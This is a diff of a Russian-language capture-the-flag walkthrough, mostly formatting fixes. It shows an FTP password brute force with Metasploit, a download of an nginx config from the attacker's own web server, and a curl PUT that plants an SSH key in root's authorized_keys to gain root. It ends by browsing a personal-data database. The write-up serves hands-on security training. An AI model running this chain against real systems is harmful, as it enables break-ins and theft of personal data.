@@ -6,67 +6,67 @@
 
 Сканируем порты и узнаем поднятые на них сервисы при помощи nmap:
 
-sudo nmap -sS -vV 192.168.122.205
+`sudo nmap -sS -vV 192.168.122.205`
 
 ![](Aspose.Words.2abdd5fc-4121-4a57-a723-5b18ba07288b.002.png)
 
-Далее будет производиться BruteForce FTP-сервера. Запускаем метасплойт:
+Далее будет производиться BruteForce FTP-сервера. Запускаем metasploit:
 
-` `msfconsole
+`msfconsole`
 
 ![](Aspose.Words.2abdd5fc-4121-4a57-a723-5b18ba07288b.003.png)
 
 Используем шаблон для брутфорса логина фтп:
 
-use auxiliary/scanner/ftp/ftp\_login	
+`use auxiliary/scanner/ftp/ftp_login`
 
 ![](Aspose.Words.2abdd5fc-4121-4a57-a723-5b18ba07288b.004.png)
 
 Просматриваем неустановленные обязательные параметры:
 
-options
+`options`
 
 ![](Aspose.Words.2abdd5fc-4121-4a57-a723-5b18ba07288b.005.png)
 
 Указываем IP-адрес атакуемого сервера:
 
-set RHOSTS 192.168.122.205
+`set RHOSTS 192.168.122.205`
 
 ![](Aspose.Words.2abdd5fc-4121-4a57-a723-5b18ba07288b.006.png)
 
 Устанавливаем имя пользователя, с которым будем брутфорсить пароль:
 
-set USERNAME IvanPopov\_IT
+`set USERNAME IvanPopov_IT`
 
 ![](Aspose.Words.2abdd5fc-4121-4a57-a723-5b18ba07288b.007.png)
 
 При помощи wget скачиваем список самых популярных паролей с github в .txt файле:
 
-wget <https://raw.githubusercontent.com/danielmiessler/SecLists/refs/heads/master/Passwords/2023-200_most_used_passwords.txt>
+`wget <https://raw.githubusercontent.com/danielmiessler/SecLists/refs/heads/master/Passwords/2023-200_most_used_passwords.txt>`
 
 ![](Aspose.Words.2abdd5fc-4121-4a57-a723-5b18ba07288b.008.png)
 
 После чего применяем его командой:
 
-set PASS\_FILE /path/to/passwords.txt
+`set PASS_FILE /home/kk/2023-200_most_used_passwords.txt`
 
 ![](Aspose.Words.2abdd5fc-4121-4a57-a723-5b18ba07288b.009.png)
 
 Запускаем брутфорс с помощью команды:
 
-run
+`run`
 
 После успешного подбора пароля получаем следующий вывод:
 
 ![](Aspose.Words.2abdd5fc-4121-4a57-a723-5b18ba07288b.010.png)
 
-Теперь мы имеем доступ к файлам пользователя IvanPopov\_IT на ftp-сервере. 
+Теперь мы имеем доступ к файлам пользователя IvanPopov_IT на ftp-сервере. 
 
 Производим успешный вход на ftp при помощи любого графического клиента ftp, в нашем случае FileZilla:
 
 ![](Aspose.Words.2abdd5fc-4121-4a57-a723-5b18ba07288b.011.png)
 
-После успешного входа в директории FilesForMyFirstJob наблюдаем два файла, user.php и readme\_ftp.txt:
+После успешного входа в директории FilesForMyFirstJob наблюдаем два файла, user.php и readme_ftp.txt:
 
 ![](Aspose.Words.2abdd5fc-4121-4a57-a723-5b18ba07288b.012.png)
 
@@ -76,7 +76,7 @@ run
 
 Теперь у нас есть первый флаг.
 
-Прочитав readme\_ftp.txt, узнаем, что нужно найти строки, касающиеся проверки паролей, а также попытаться решить проблему с картинкой:
+Прочитав readme_ftp.txt, узнаем, что нужно найти строки, касающиеся проверки паролей, а также попытаться решить проблему с картинкой:
 
 ![](Aspose.Words.2abdd5fc-4121-4a57-a723-5b18ba07288b.014.png)
 
@@ -100,15 +100,15 @@ run
 
 ![](Aspose.Words.2abdd5fc-4121-4a57-a723-5b18ba07288b.019.png)
 
-Здесь наблюдаем поломанную картинку, о которой говорится в readme\_ftp.txt, она изменена при помощи стеганографии, а именно простого HEX-редактирования заголовка IHDR. Чтобы восстановить изображение, мы будем использовать скрипт, который определит реальную высоту изображения и восстановит его. 
+Здесь наблюдаем поломанную картинку, о которой говорится в readme_ftp.txt, она изменена при помощи стеганографии, а именно простого HEX-редактирования заголовка IHDR. Чтобы восстановить изображение, мы будем использовать скрипт, который определит реальную высоту изображения и восстановит его. 
 
 Один из таких скриптов можно скачать с github:
 
-git clone <https://github.com/DianaNeumann/IHDR-Solver>
+`git clone <https://github.com/DianaNeumann/IHDR-Solver>`
 
 Запускаем скрипт, указывая изображение, которое следует восстановить:
 
-python IHDR-Solver/ihdr-stego.py fix\_me\_pls.png
+`python IHDR-Solver/ihdr-stego.py fix_me_pls.png`
 
 ![](Aspose.Words.2abdd5fc-4121-4a57-a723-5b18ba07288b.020.png)
 
@@ -121,9 +121,11 @@ python IHDR-Solver/ihdr-stego.py fix\_me\_pls.png
 ![](Aspose.Words.2abdd5fc-4121-4a57-a723-5b18ba07288b.022.png)
 
 Далее нам необходимо проверить, можем ли мы использовать какие-либо команды из-под root без пароля, для этого пропишем:
-sudo -l
+
+`sudo -l`
 
 И увидим следующее:
+
 ![](Aspose.Words.2abdd5fc-4121-4a57-a723-5b18ba07288b.023.png)
 
 Теперь нам известно, что есть возможность запускать nginx от root без пароля. Далее необходимо создать файл nginx.conf и привести его к следующему виду:
@@ -132,45 +134,45 @@ sudo -l
 
 Сохраняем файл и переходим к следующему действию. Теперь нам нужно запустить веб-сервер python. В нашем случае будет использоваться стандартный порт 8000:
 
-python3 -m http.server
+`python3 -m http.server`
 
 ![](Aspose.Words.2abdd5fc-4121-4a57-a723-5b18ba07288b.025.png)
 
 Теперь снова открываем WPTerm и качаем созданный ранее конфигурационный файл nginx в директорию /tmp с помощью wget с python-сервера:
 
-cd /tmp
+`cd /tmp`
 
-wget 192.168.122.128:8000/nginx.conf
+`wget 192.168.122.128:8000/nginx.conf`
 
 ![](Aspose.Words.2abdd5fc-4121-4a57-a723-5b18ba07288b.026.png)
 
 После проделанных действий запускаем nginx со скачанным конфигурационным файлом:
 
-sudo /usr/sbin/nginx -c /tmp/nginx.conf 
+`sudo /usr/sbin/nginx -c /tmp/nginx.conf `
 
 ![](Aspose.Words.2abdd5fc-4121-4a57-a723-5b18ba07288b.027.png)
 
 Выходим из WPTerm и генерируем ssh-ключи:
 
-ssh-keygen
+`ssh-keygen`
 
 ![](Aspose.Words.2abdd5fc-4121-4a57-a723-5b18ba07288b.028.png)
 
 Выводим и копируем созданный публичный ключ:
 
-cat ~/.ssh/id\_ed25519.pub
+`cat ~/.ssh/id_ed25519.pub`
 
 ![](Aspose.Words.2abdd5fc-4121-4a57-a723-5b18ba07288b.029.png)
 
-С помощью curl делаем PUT-запрос, чтобы передать ключ на сервер в папку authorized\_keys:
+С помощью curl делаем PUT-запрос, чтобы передать ключ на сервер в папку authorized_keys:
 
-curl -X PUT http://192.168.122.205:9899/root/.ssh/authorized\_keys --data " ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIEJHHw+Ys12uGzQRm/rd8iuO3gGuJIWN3OZhocEVyRM9 kk@kk"
+`curl -X PUT http://192.168.122.205:9899/root/.ssh/authorized_keys --data " ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIEJHHw+Ys12uGzQRm/rd8iuO3gGuJIWN3OZhocEVyRM9 kk@kk"`
 
 ![](Aspose.Words.2abdd5fc-4121-4a57-a723-5b18ba07288b.030.png)
 
 Благодаря этим действиям мы можем подключиться через SSH под пользователем root без пароля:
 
-ssh root@192.168.122.205
+`ssh root@192.168.122.205`
 
 ![](Aspose.Words.2abdd5fc-4121-4a57-a723-5b18ba07288b.031.png)
 
@@ -180,19 +182,19 @@ ssh root@192.168.122.205
 
 Теперь, как вариант, можем попытаться получить информацию из баз данных. Входим в mysql под пользователем root c использованием пароля, на строку “Enter password:” не обращаем внимания, жмем Enter:
 
-mysql -u root -p
+`mysql -u root -p`
 
 ![](Aspose.Words.2abdd5fc-4121-4a57-a723-5b18ba07288b.033.png)
 
 Далее необходимо проверить список доступных баз данных:
 
-show databases;
+`show databases;`
 
 ![](Aspose.Words.2abdd5fc-4121-4a57-a723-5b18ba07288b.034.png)
 
-Наблюдаем интересную для нас БД “personal\_data\_users”, которая скорее всего содержит персональные данные. Выбираем ее:
+Наблюдаем интересную для нас БД “personal_data_users”, которая скорее всего содержит персональные данные. Выбираем ее:
 
-use personal\_data\_users;
+`use personal_data_users;`
 
 ![](Aspose.Words.2abdd5fc-4121-4a57-a723-5b18ba07288b.035.png)
 
@@ -214,4 +216,4 @@ use personal\_data\_users;
 
 В итоге, независимо от используемого метода, мы все равно получим расшифрованный флаг:
 
-flag{ucompletedthetask}
+`flag{ucompletedthetask}`
